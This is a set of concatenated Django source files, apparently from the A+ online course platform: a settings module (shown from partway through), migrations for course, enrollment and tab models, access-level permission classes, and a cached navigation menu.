#SHIB_LAST_NAME_KEY = 'SHIB_sn'
#SHIB_MAIL_KEY = 'SHIB_mail'
#SHIB_STUDENT_ID_KEY = 'SHIB_schacPersonalUniqueCode'


## Google OAuth2 settings

#INSTALLED_APPS += ('social_django',)
#SOCIAL_AUTH_GOOGLE_OAUTH2_KEY = ''
#SOCIAL_AUTH_GOOGLE_OAUTH2_SECRET = ''
SOCIAL_AUTH_URL_NAMESPACE = 'social'
SOCIAL_AUTH_USERNAME_IS_FULL_EMAIL = True

##########################################################################

MIDDLEWARE_CLASSES = (
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'lib.middleware.SqlInjectionMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',
    'django.middleware.locale.LocaleMiddleware',
    'django.middleware.common.CommonMiddleware',
    'social_django.middleware.SocialAuthExceptionMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
)

ROOT_URLCONF = 'aplus.urls'
LOGIN_REDIRECT_URL = ""/""
LOGIN_ERROR_URL = ""/accounts/login/""

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [
            join(BASE_DIR, 'local_templates'),
            join(BASE_DIR, 'templates'),
        ],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                ""django.contrib.auth.context_processors.auth"",
                ""django.template.context_processors.debug"",
                'django.template.context_processors.request',
                ""django.template.context_processors.i18n"",
                ""django.template.context_processors.media"",
                ""django.template.context_processors.static"",
                ""django.contrib.messages.context_processors.messages"",
            ],
        },
    },
]

FILE_UPLOAD_HANDLERS = (
    #""django.core.files.uploadhandler.MemoryFileUploadHandler"",
    ""django.core.files.uploadhandler.TemporaryFileUploadHandler"",
)

WSGI_APPLICATION = 'aplus.wsgi.application'


# Database (override in local_settings.py)
# https://docs.djangoproject.com/en/1.7/ref/settings/#databases
##########################################################################
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3', # Add 'postgresql_psycopg2', 'postgresql', 'mysql', 'sqlite3' or 'oracle'.
        'NAME': join(BASE_DIR, 'aplus.db'), # Or path to database file if using sqlite3.
        'USER': '', # Not used with sqlite3.
        'PASSWORD': '', # Not used with sqlite3.
        'HOST': '', # Set to empty string for localhost. Not used with sqlite3.
        'PORT': '', # Set to empty string for default. Not used with sqlite3.
    }
}
##########################################################################

# Cache (override in local_settings.py)
# https://docs.djangoproject.com/en/1.10/topics/cache
##########################################################################
CACHES = {
    'default': {
        'BACKEND': 'lib.cache.backends.LocMemCache',
        'TIMEOUT': None,
        'OPTIONS': {'MAX_SIZE': 1000000}, # simulate memcached value limit
    }
}
#SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'
##########################################################################

# Internationalization (may override in local_settings.py)
# https://docs.djangoproject.com/en/1.7/topics/i18n/
LANGUAGE_CODE = 'en-gb'
LANGUAGES = [
    ('en', 'English'),
    ('fi', 'Finnish'),
]
TIME_ZONE = 'EET'
USE_I18N = True
USE_L10N = True
USE_TZ = True
FORMAT_MODULE_PATH = 'aplus'
LOCALE_PATHS = (
    join(BASE_DIR, 'locale'),
)

# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/1.7/howto/static-files/
STATICFILES_STORAGE = 'lib.storage.BumpStaticFilesStorage'
STATICFILES_DIRS = (
    join(BASE_DIR, 'assets'),
)
STATIC_URL = '/static/'
STATIC_ROOT = join(BASE_DIR, 'static')

MEDIA_URL = '/media/'
MEDIA_ROOT = join(BASE_DIR, 'media')

# Django REST Framework settings
# http://www.django-rest-framework.org/api-guide/settings/
REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': (
        # Clients should use token for authentication
        # Requires rest_framework.authtoken in apps.
        'rest_framework.authentication.TokenAuthentication',
        'lib.api.authentication.grader.GraderAuthentication',
        'rest_framework.authentication.SessionAuthentication',
    ),
    'DEFAULT_PERMISSION_CLASSES': (
        # If not other permissions are defined, require login.
        'rest_framework.permissions.IsAuthenticated',
        'userprofile.permissions.GraderUserCanOnlyRead',
    ),
    'DEFAULT_RENDERER_CLASSES': (
        'lib.api.core.APlusJSONRenderer',
        'rest_framework.renderers.BrowsableAPIRenderer',
    ),
    'DEFAULT_CONTENT_NEGOTIATION_CLASS': 'lib.api.core.APlusContentNegotiation',
    'DEFAULT_VERSIONING_CLASS': 'lib.api.core.APlusVersioning',
    'PAGE_SIZE': 100,
    'DEFAULT_VERSION': '2',
    'ALLOWED_VERSIONS': {
        # These are really just latest versions
        '1': '1.0',
        '2': '2.0',
    },
}


# Test environment url fixes are implemented using these. Typically not required for production
OVERRIDE_SUBMISSION_HOST = None
REMOTE_PAGE_HOSTS_MAP = None

# Maximum submissions limit for exercises that allow unofficial submissions.
# The exercise-specific max submissions limit may then be exceeded, however,
# this limit will prevent students from spamming massive amounts of submissions.
# Set this value to zero in order to remove the limit.
MAX_UNOFFICIAL_SUBMISSIONS = 200

# Testing
# https://docs.djangoproject.com/en/1.7/topics/testing/advanced/
TEST_RUNNER = ""xmlrunner.extra.djangotestrunner.XMLTestRunner""
TEST_OUTPUT_VERBOSE = True
TEST_OUTPUT_DESCRIPTIONS = True
TEST_OUTPUT_DIR = ""test_results""

# Logging
# https://docs.djangoproject.com/en/1.7/topics/logging/
from lib.logging import skip_unreadable_post
LOGGING = {
  'version': 1,
  'disable_existing_loggers': False,
  'formatters': {
    'verbose': {
      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s'
    },
    'colored': {
      '()': 'r_django_essentials.logging.SourceColorizeFormatter',
      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s',
      'colors': {
        'django.db.backends': {'fg': 'cyan'},
        'django.db.deferred': {'fg': 'yellow'},
        'cached': {'fg': 'red'},
      },
    },
  },
  'filters': {
    'skip_unreadable_post': {
        '()': 'django.utils.log.CallbackFilter',
        'callback': skip_unreadable_post,
    },
    'require_debug_true': {
      '()': 'django.utils.log.RequireDebugTrue',
    },
    'require_debug_false': {
      '()': 'django.utils.log.RequireDebugFalse',
    },
  },
  'handlers': {
    'debug_console': {
      'level': 'DEBUG',
      'filters': ['require_debug_true'],
      'class': 'logging.StreamHandler',
      'stream': 'ext://sys.stdout',
      'formatter': 'colored',
    },
    'console': {
      'level': 'DEBUG',
      'class': 'logging.StreamHandler',
      'stream': 'ext://sys.stdout',
      'formatter': 'verbose',
    },
    'email': {
      'level': 'ERROR',
      'filters': ['require_debug_false', 'skip_unreadable_post'],
      'class': 'django.utils.log.AdminEmailHandler',
    },
    'mail_admins': {
      # Duplicate of above, so if django internally refers it, we will use our filters
      'level': 'ERROR',
      'filters': ['require_debug_false', 'skip_unreadable_post'],
      'class': 'django.utils.log.AdminEmailHandler',
    },
  },
  'loggers': {
    '': {
      'level': 'INFO',
      'handlers': ['console', 'email'],
      'propagate': True
    },
    # Django defines these loggers internally, so we need to reconfigure them.
    'django': {
      'level': 'INFO',
      'handlers': ['console', 'email'],
    },
    'py.warnings': {
      'handlers': ['console'],
    },
  },
}





###############################################################################
#
# Logic to load settings from other files and tune them based on DEBUG
#
from os import environ
from r_django_essentials.conf import *

# Load settings from: local_settings, secret_key and environment
update_settings_with_file(__name__,
                          environ.get('APLUS_LOCAL_SETTINGS', 'local_settings'),
                          quiet='APLUS_LOCAL_SETTINGS' in environ)
update_settings_from_environment(__name__, 'DJANGO_') # FIXME: deprecated. was used with containers before, so keep it here for now.
update_settings_from_environment(__name__, 'APLUS_')
update_secret_from_file(__name__, environ.get('APLUS_SECRET_KEY_FILE', 'secret_key'))

# Complain if BASE_URL is not set
try:
    if not BASE_URL:
        raise RuntimeError('Local setting BASE_URL should be non-empty')
except NameError as e:
    raise RuntimeError('BASE_URL must be specified in local settings') from e

# update INSTALLED_APPS
if 'INSTALLED_LOGIN_APPS' in globals():
    INSTALLED_APPS = INSTALLED_LOGIN_APPS + INSTALLED_APPS

# update template loaders for production
use_cache_template_loader_in_production(__name__)

# setup authentication backends based on installed_apps
SOCIAL_AUTH = False
AUTHENTICATION_BACKENDS = (
    'django.contrib.auth.backends.ModelBackend',
)
if 'shibboleth_login' in INSTALLED_APPS:
    AUTHENTICATION_BACKENDS += ('shibboleth_login.auth_backend.ShibbolethAuthBackend',)
if 'social_django' in INSTALLED_APPS:
    SOCIAL_AUTH = True
    AUTHENTICATION_BACKENDS += ('social_core.backends.google.GoogleOAuth2',)



if DEBUG:
    # Allow basic auth for API when DEBUG is on
    REST_FRAMEWORK['DEFAULT_AUTHENTICATION_CLASSES'] += ('rest_framework.authentication.BasicAuthentication',)
    # Enable defer logging
    from lib.models import install_defer_logger
    install_defer_logger()
/n/n/n/apps/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('contenttypes', '0001_initial'),
        ('inheritance', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='BasePlugin',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),
                ('container_pk', models.TextField(verbose_name='object ID')),
                ('title', models.CharField(max_length=64)),
                ('views', models.CharField(blank=True, max_length=255)),
            ],
            options={
                'abstract': False,
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='BaseTab',
            fields=[
                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),
                ('container_pk', models.TextField(verbose_name='object ID')),
                ('label', models.CharField(max_length=12)),
                ('title', models.CharField(max_length=64)),
                ('order', models.IntegerField(default=100)),
                ('opening_method', models.CharField(blank=True, max_length=32)),
            ],
            options={
                'ordering': ['order', 'id'],
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='EmbeddedTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),
                ('content_url', models.URLField(max_length=128)),
                ('element_id', models.CharField(blank=True, max_length=32)),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='ExternalIFramePlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),
                ('service_url', models.URLField(max_length=255)),
                ('width', models.IntegerField()),
                ('height', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.CreateModel(
            name='ExternalIFrameTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),
                ('content_url', models.URLField(max_length=255)),
                ('width', models.IntegerField()),
                ('height', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='HTMLPlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),
                ('content', models.TextField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.CreateModel(
            name='HTMLTab',
            fields=[
                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),
                ('content', models.TextField()),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.basetab',),
        ),
        migrations.CreateModel(
            name='RSSPlugin',
            fields=[
                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),
                ('feed_url', models.URLField(max_length=256)),
            ],
            options={
                'abstract': False,
            },
            bases=('apps.baseplugin',),
        ),
        migrations.AddField(
            model_name='basetab',
            name='container_type',
            field=models.ForeignKey(to='contenttypes.ContentType'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='baseplugin',
            name='container_type',
            field=models.ForeignKey(to='contenttypes.ContentType'),
            preserve_default=True,
        ),
    ]
/n/n/n/apps/templatetags/apps.py/n/nimport logging

from django import template

from apps.app_renderers import build_plugin_renderers
from course.models import CourseInstance
from exercise.exercise_models import BaseExercise
from exercise.submission_models import Submission


logger = logging.getLogger(""aplus.apps"")
register = template.Library()


@register.assignment_tag
def plugin_renderers(user, some_model, view_name=None):
    """"""
    Builds the plugin renderers for a view.
    """"""
    profile = user.userprofile if user.is_authenticated() else None
    if isinstance(some_model, CourseInstance):
        return build_plugin_renderers(
            some_model.plugins.all(),
            view_name or ""course_instance"",
            user_profile=profile,
            course_instance=some_model,
        )
    if isinstance(some_model, BaseExercise):
        course_instance = some_model.course_instance
        return build_plugin_renderers(
            course_instance.plugins.all(),
            view_name or ""exercise"",
            user_profile=profile,
            exercise=some_model,
            course_instance=course_instance,
        )
    if isinstance(some_model, Submission):
        course_instance = some_model.exercise.course_instance
        return build_plugin_renderers(
            course_instance.plugins.all(),
            view_name or ""submission"",
            user_profile=profile,
            submission=some_model,
            exercise=some_model.exercise,
            course_instance=course_instance,
        )
    logger.warn(""Unrecognized model type received for plugin_renderers tag: {}"" \
                .format(str(type(some_model))))
    return []
/n/n/n/authorization/permissions.py/n/nfrom django.utils.translation import string_concat, ugettext_lazy as _

try:
    from django.utils.text import format_lazy
except ImportError: # implemented in Django 1.11
    from django.utils.functional import lazy as _lazy
    def _format_lazy(format_string, *args, **kwargs):
        return format_string.format(*args, **kwargs)
    format_lazy = _lazy(_format_lazy, str)

from lib.helpers import Enum

""""""
Base permission classes.

These classes use same interface than ones in django-rest-framework and
are usable with APIViews too. We define our superclass so we don't need to
depend on django-rest-framework.
""""""


SAFE_METHODS = ('GET', 'HEAD', 'OPTIONS')


class FilterBackend(object):
    """"""
    FilterBackend interface
    """"""
    def filter_queryset(self, request, queryset, view):
        """"""
        Return a filtered queryset.
        """"""
        raise NotImplementedError

    def get_fields(self, view):
        return []


class Permission(object):
    """"""
    Permission interface
    """"""
    def has_permission(self, request, view):
        """"""
        Return `True` if permission is granted, `False` otherwise.
        """"""
        return True

    def has_object_permission(self, request, view, obj):
        """"""
        Return `True` if permission is granted, `False` otherwise.
        """"""
        return True


class NoPermission(Permission):
    """"""
    Base Permission class that gives no access permission to anyone.
    """"""
    def has_permission(self, request, view):
        return False

    def has_object_permission(self, request, view, obj):
        return False


class MessageMixin(object):
    """"""
    Adds easy way to specify what exactly caused the PermissionDenied
    """"""
    def error_msg(self, message: str, delim=None, format=None, replace=False):
        """"""
        Add extra text to self.message about the reason why permission
        was denied. Uses lazy object so the message string is evaluated
        only when rendered.

        If optional argument `format` is given, then it's used with format_lazy
        to format the message with the dictionary arguments from `format` arg.

        Optional argument `delim` can be used to change the string used to join
        self.message and `message`.

        If optional argument `replace` is true, then self.message is replaced with
        the `message`.
        """"""
        if delim is None:
            delim = ': '

        if format:
            message = format_lazy(message, **format)

        if replace:
            self.message = message
        else:
            assert 'message' not in self.__dict__, (
                ""You are calling error_msg without replace=True ""
                ""after calling it with it firts. Fix your code by removing ""
                ""firts method call add replace=True to second method call too.""
            )
            self.message = string_concat(self.message, delim, message)


# Access mode
# ===========

# All access levels
ACCESS = Enum(
    ('ANONYMOUS', 0, _(""Any user authenticated or not"")),
    ('ENROLL', 1, None),
    ('STUDENT', 3, _(""Any authenticated student"")),
    ('ENROLLED', 4, _(""Enrolled student of the course"")),
    ('ASSISTANT', 5, _(""Assistant of the course"")),
    ('GRADING', 6, _(""Grading. Assistant if course has that option or teacher"")),
    ('TEACHER', 10, _(""Teacher of the course"")),
    ('SUPERUSER', 100, _(""Superuser of the service"")),
)


class AccessModePermission(MessageMixin, Permission):
    """"""
    If view has access_mode that is not anonymous, then require authentication
    """"""
    message = _(""Permission denied by access mode."")

    def has_permission(self, request, view):
        access_mode = view.get_access_mode()

        if access_mode == ACCESS.ANONYMOUS:
            return True
        if not request.user.is_authenticated():
            return False

        if access_mode >= ACCESS.SUPERUSER:
            return request.user.is_superuser

        if access_mode >= ACCESS.TEACHER:
            if not view.is_teacher:
                self.error_msg(_(""Only course teachers shall pass.""))
                return False

        elif access_mode >= ACCESS.ASSISTANT:
            if not view.is_course_staff:
                self.error_msg(_(""Only course staff shall pass.""))
                return False

        elif access_mode == ACCESS.ENROLLED:
            if not view.is_course_staff and not view.is_student:
                self.error_msg(_(""Only enrolled students shall pass.""))
                return False

        return True


# Object permissions
# ==================


class ObjectVisibleBasePermission(MessageMixin, Permission):
    model = None
    obj_var = None

    def has_permission(self, request, view):
        obj = getattr(view, self.obj_var, None)
        return (
            obj is None or
            self.has_object_permission(request, view, obj)
        )

    def has_object_permission(self, request, view, obj):
        user = request.user
        return (
            not isinstance(obj, self.model) or # skip objects that are not model in question
            user.is_staff or
            user.is_superuser or
            self.is_object_visible(request, view, obj)
        )

    def is_object_visible(self, request, view, obj):
        raise NotImplementedError
/n/n/n/course/cache/menu.py/n/nfrom django.db.models.signals import post_save, post_delete, m2m_changed
from django.utils import timezone

from lib.cache import CachedAbstract
from ..models import StudentGroup, Enrollment, CourseInstance, Course
from ..renders import render_group_info


class CachedTopMenu(CachedAbstract):
    KEY_PREFIX = 'topmenu'

    def __init__(self, user):
        self.user = user
        super().__init__(user)

    def _generate_data(self, user, data=None):
        profile = user.userprofile if user and user.is_authenticated() else None
        return {
            'courses': self._generate_courses(profile),
            'groups': self._generate_groups(profile),
        }

    def _generate_courses(self, profile):
        if not profile:
            return []

        def course_entry(instance):
            return {
                'name': str(instance),
                'link': instance.get_absolute_url(),
            }
        def divider_entry():
            return {
                'divider': True,
            }

        enrolled = []
        for instance in profile.enrolled.all():
            enrolled.append(course_entry(instance))

        teaching = []
        for course in profile.teaching_courses.all():
            for instance in course.instances.all():
                teaching.append(course_entry(instance))

        assisting = []
        for instance in profile.assisting_courses.all():
            assisting.append(course_entry(instance))

        courses = []
        courses.extend(enrolled)
        if courses and teaching:
            courses.append(divider_entry())
        courses.extend(teaching)
        if courses and assisting:
            courses.append(divider_entry())
        courses.extend(assisting)
        return courses

    def _generate_groups(self, profile):
        if not profile:
            return {}

        def group_entry(group):
            return {
                'id': group.id,
                'size': group.members.count(),
                'collaborators': group.collaborator_names(profile),
            }

        group_map = {}
        for enrollment in Enrollment.objects\
                .filter(user_profile=profile)\
                .select_related('selected_group')\
                .prefetch_related('selected_group__members'):
            instance_id = enrollment.course_instance_id
            group_map[instance_id] = (
                [
                    group_entry(g) for g in profile.groups\
                        .filter(course_instance_id=instance_id)\
                        .prefetch_related('members')
                ],
                render_group_info(enrollment.selected_group, profile)
            )
        return group_map

    def courses(self):
        return self.data['courses']

    def groups(self, instance):
        return self.data['groups'].get(instance.id, ([],None))


def invalidate_content(sender, instance, **kwargs):
    CachedTopMenu.invalidate(instance.user_profile.user)

def invalidate_assistants(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.assistants.all():
            CachedTopMenu.invalidate(profile.user)

def invalidate_teachers(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.teachers.all():
            CachedTopMenu.invalidate(profile.user)

def invalidate_members(sender, instance, reverse=False, **kwargs):
    if reverse:
        CachedTopMenu.invalidate(instance.user)
    else:
        for profile in instance.members.all():
            CachedTopMenu.invalidate(profile.user)


# Automatically invalidate cached menu when enrolled or edited.
post_save.connect(invalidate_content, sender=Enrollment)
post_delete.connect(invalidate_content, sender=Enrollment)
m2m_changed.connect(invalidate_assistants, sender=CourseInstance.assistants.through)
m2m_changed.connect(invalidate_teachers, sender=Course.teachers.through)
m2m_changed.connect(invalidate_members, sender=StudentGroup.members.through)
/n/n/n/course/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-


from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='Course',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=255)),
                ('code', models.CharField(max_length=255)),
                ('url', models.CharField(help_text=b""Input an identifier for this course's URL."", unique=True, max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\w\\-\\.]*$')])),
                ('teachers', models.ManyToManyField(related_name='teaching_courses', to='userprofile.UserProfile', blank=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='CourseHook',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('hook_url', models.URLField()),
                ('hook_type', models.CharField(default=b'post-grading', max_length=12, choices=[(b'post-grading', b'Post grading')])),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='CourseInstance',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('instance_name', models.CharField(max_length=255)),
                ('website', models.URLField(max_length=255, blank=True)),
                ('url', models.CharField(help_text=b'Input an URL identifier for this course.', max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\w\\-\\.]*$')])),
                ('starting_time', models.DateTimeField()),
                ('ending_time', models.DateTimeField()),
                ('visible_to_students', models.BooleanField(default=True)),
                ('assistants', models.ManyToManyField(related_name='assisting_courses', to='userprofile.UserProfile', blank=True)),
                ('course', models.ForeignKey(related_name='instances', to='course.Course')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='courseinstance',
            unique_together=set([('course', 'url')]),
        ),
        migrations.AddField(
            model_name='coursehook',
            name='course_instance',
            field=models.ForeignKey(related_name='course_hooks', to='course.CourseInstance'),
            preserve_default=True,
        ),
    ]
/n/n/n/course/migrations/0005_auto_20150625_1835.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.utils.timezone
import lib.fields
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('userprofile', '0002_auto_20150427_1717'),
        ('inheritance', '0001_initial'),
        ('course', '0004_auto_20150625_1821'),
    ]

    state_operations = [
        migrations.CreateModel(
            name='CourseModule',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('name', models.CharField(max_length=255)),
                ('url', models.CharField(max_length=255, validators=[django.core.validators.RegexValidator(regex='^(?!teachers$)(?!user$)[\\w\\-\\.]*$')], help_text='Input an URL identifier for this module. Taken words include: teachers, user')),
                ('chapter', models.IntegerField(default=1)),
                ('subchapter', models.IntegerField(default=1)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('introduction', models.TextField(blank=True)),
                ('opening_time', models.DateTimeField(default=django.utils.timezone.now)),
                ('closing_time', models.DateTimeField(default=django.utils.timezone.now)),
                ('content_url', models.URLField(blank=True)),
                ('late_submissions_allowed', models.BooleanField(default=False)),
                ('late_submission_deadline', models.DateTimeField(default=django.utils.timezone.now)),
                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),
                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),
            ],
            options={
                'ordering': ['closing_time', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='LearningObjectCategory',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('name', models.CharField(max_length=35)),
                ('description', models.TextField(blank=True)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),
                ('hidden_to', models.ManyToManyField(blank=True, related_name='hidden_categories', null=True, to='userprofile.UserProfile')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='learningobjectcategory',
            unique_together=set([('name', 'course_instance')]),
        ),
        migrations.AlterUniqueTogether(
            name='coursemodule',
            unique_together=set([('course_instance', 'url')]),
        ),
    ]

    operations = [
        migrations.SeparateDatabaseAndState(state_operations=state_operations)
    ]
/n/n/n/course/migrations/0006_auto_20150721_1152.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0005_auto_20150625_1835'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseChapter',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, verbose_name='ID', serialize=False)),
                ('order', models.IntegerField(default=1)),
                ('name', models.CharField(max_length=255)),
                ('url', models.CharField(help_text='Input an URL identifier for this chapter.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255)),
                ('content_url', models.URLField(help_text='The resource to show.')),
                ('course_module', models.ForeignKey(related_name='chapters', to='course.CourseModule')),
            ],
            options={
                'ordering': ['course_module', 'order', 'id'],
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='coursechapter',
            unique_together=set([('course_module', 'url')]),
        ),
        migrations.AlterModelOptions(
            name='coursemodule',
            options={'ordering': ['closing_time', 'order', 'id']},
        ),
        migrations.RenameField(
            model_name='coursemodule',
            old_name='chapter',
            new_name='order',
        ),
        migrations.RemoveField(
            model_name='coursemodule',
            name='content_url',
        ),
        migrations.RemoveField(
            model_name='coursemodule',
            name='subchapter',
        ),
        migrations.AlterField(
            model_name='course',
            name='url',
            field=models.CharField(unique=True, validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255, help_text='Input an URL identifier for this course.'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='url',
            field=models.CharField(help_text='Input an URL identifier for this module.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255),
            preserve_default=True,
        ),
    ]
/n/n/n/course/migrations/0011_auto_20151215_1133.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0010_auto_20151214_1714'),
    ]

    operations = [
        migrations.AddField(
            model_name='coursechapter',
            name='parent',
            field=models.ForeignKey(to='course.CourseChapter', blank=True, null=True, related_name='children'),
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='coursechapter',
            unique_together=set([]),
        ),
    ]
/n/n/n/course/migrations/0021_auto_20160726_1209.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0002_auto_20150427_1717'),
        ('course', '0020_auto_20160615_1239'),
    ]

    operations = [
        migrations.CreateModel(
            name='Enrollment',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('personal_code', models.CharField(max_length=10, blank=True, default='')),
                ('course_instance', models.ForeignKey(to='course.CourseInstance')),
                ('user_profile', models.ForeignKey(to='userprofile.UserProfile')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='courseinstance',
            name='students2',
            field=models.ManyToManyField(to='userprofile.UserProfile', through='course.Enrollment', related_name='enrolled', blank=True),
            preserve_default=True,
        ),
    ]
/n/n/n/course/migrations/0025_auto_20160728_1139.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.db.models.deletion


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0003_auto_20160728_1139'),
        ('course', '0024_auto_20160726_1232'),
    ]

    operations = [
        migrations.CreateModel(
            name='StudentGroup',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('course_instance', models.ForeignKey(related_name='groups', to='course.CourseInstance')),
                ('members', models.ManyToManyField(to='userprofile.UserProfile', related_name='groups')),
            ],
            options={
                'ordering': ['course_instance', 'timestamp'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='enrollment',
            name='selected_group',
            field=models.ForeignKey(null=True, on_delete=django.db.models.deletion.SET_NULL, default=None, blank=True, to='course.StudentGroup'),
            preserve_default=True,
        ),
    ]
/n/n/n/course/migrations/0029_usertags.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import lib.models
import colorfield.fields


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0003_auto_20160728_1139'),
        ('course', '0028_auto_20160825_0601'),
    ]

    operations = [
        migrations.CreateModel(
            name='UserTag',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('name', models.CharField(max_length=200)),
                ('description', models.CharField(blank=True, max_length=164, help_text='Describe the usage or meaning of this usertag')),
                ('visible_to_students', models.BooleanField(default=False)),
                ('color', colorfield.fields.ColorField(default='#CD0000', help_text='Color that is used for this tag.', max_length=10)),
                ('course_instance', models.ForeignKey(related_name='usertags', to='course.CourseInstance')),
            ],
            options={
            },
            bases=(lib.models.UrlMixin, models.Model),
        ),
        migrations.CreateModel(
            name='UserTagging',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('course_instance', models.ForeignKey(related_name='taggings', to='course.CourseInstance')),
                ('tag', models.ForeignKey(related_name='taggings', to='course.UserTag')),
                ('user', models.ForeignKey(related_name='taggings', to='userprofile.UserProfile')),
            ],
            options={
            },
